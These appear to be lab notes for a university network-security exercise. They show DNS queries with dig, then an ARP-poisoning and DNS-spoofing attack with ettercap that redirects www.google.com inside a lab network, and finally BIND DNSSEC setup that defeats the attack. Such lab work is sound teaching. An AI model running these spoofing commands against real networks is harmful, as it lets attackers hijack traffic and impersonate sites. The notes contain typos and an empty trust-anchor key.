# PART 1

Perform a DNS request:

    dig www.google.com A

Show the IP of the cache server.

Show the satus of the request.

Show the IP of `www.google.com`.

Show the TTL of the request.

Show the authoritative name server of `www.google.com` and its IP.

# PART 2

Do a `tcpdump` from the attacker:

    sudo tcmdump -nnti ethX

No traffic is intercepted if a dig request is perfromed by the client -> the traffic does not pass through the attacker.

# PART 2-3

Edit `/etc/ettercap/etter.dns`

    sudo nano /etc/ettercap/etter.dns

Add

    www.google.com A 10.1.2.4

Start ettercap on the attacker:

    sudo ettercap -T -i ethX -M arp /10.1.2.2// /10.1.2.3//

Show how the arp table of the cache server is poisoned:

    arp -nn

Show that intercept the traffic, explain the previous modification at `etter.dns`.

Start the attack: `p` -> `dns_spoof`.

Perform a dig request from the client and show how the IP is changed.

Clear the cache on the cache server

    sudo rndc flush

# PART 4.1

Implementing the DNSSEC on the auth server.

Add the following command to `/etc/bind/named.conf.options`:

    dnssec-enable yes;
    dnssec-validation yes;

the second options is for requiring manually-configured trust anchors using trusted-keys or managed-keys.

Generate a ZSK key, create a folder called keys and then

    sudo dnssec-keygen -r /dev/urandom -a RSASHA256 -b 1024 -n ZONE google.com

Sign the domain

    sudo dnssec-signzone -S -K /etc/bind/keys/ -P -g -a -o google.com google.com

Change `named.conf` and restart the server:

    sudo service bind9 restart


# PART 4.2

Implementing the DNSSEC on the cache server.

Add the following command to `/etc/bind/named.conf.options`:

    dnssec-enable yes;
    dnssec-validation yes;

Update the `bind.keys` file:

    google.com. initial-key 256 3 8 "";

Update the named.conf file:

    include "/etc/bind/bind.keys";

Restart the server:

    sudo service bind9 restart

Perform a dig request with +dnssec option and show the result

![DNSSEC record structure](https://i.ibb.co/Yyv05NS/dnssec-record.png) 

Show how the attack do not work anymore -> result in a DOS